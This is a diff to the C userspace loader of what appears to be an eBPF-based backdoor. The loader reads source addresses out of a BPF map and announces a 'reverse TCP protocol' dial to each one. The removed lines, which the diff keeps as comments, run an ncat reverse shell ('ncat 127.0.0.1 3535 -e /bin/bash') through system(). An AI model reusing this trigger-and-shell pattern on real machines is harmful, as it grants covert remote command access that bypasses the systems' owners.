@@ -6,7 +6,7 @@
 #include <bpf/libbpf.h>
 #include <arpa/inet.h>
 #include <unistd.h>
-#include "honk.h"
+#include "proto.h"
 
 int main(int argc, char **argv) {
     char path[PATH_MAX] = "enohonk.o";
@@ -64,28 +64,27 @@ int main(int argc, char **argv) {
     printf("-----------------------------------------------\n");
 
     int lookup_key = 0, next_key;
-    struct tcp_honk h;
-    //int h;
+    struct tcp_return ret;
     int err;
 
     while(1) {
       while (!bpf_map_get_next_key(fd, &lookup_key, &next_key)) {
-        err = bpf_map_lookup_elem(fd, &next_key, &h);
+        err = bpf_map_lookup_elem(fd, &next_key, &ret);
         if (err < 0) {
-          //        fprintf(stderr, "failed to lookup exec: %d\n", err);
           return -1;
         }
 
         char addrbuf[INET_ADDRSTRLEN];
-        //inet_ntop(AF_INET, &h.saddr, addrbuf, sizeof (addrbuf));
+        inet_ntop(AF_INET, &ret.saddr, addrbuf, sizeof (addrbuf));
+
+        printf("Begin reverse TCP protocol. Dial: %s\n", addrbuf);
+
+        //printf("Calling reverse shell bash");
+        //char cmd[512] = "ncat 127.0.0.1 3535 -e /bin/bash &";
+        //system(cmd);
 
 
-        printf("Calling reverse shell bash");
-        char cmd[512] = "ncat 127.0.0.1 3535 -e /bin/bash &";
-        system(cmd);
-
-
-        printf("Returned from bpf map: %p\n", h.saddr);
+        //("Returned from bpf map: %p\n", h.saddr);
         //printf("3Returned from bpf map: %pISpc", &h.saddr);
         err = bpf_map_delete_elem(fd, &next_key);
         if (err < 0) {
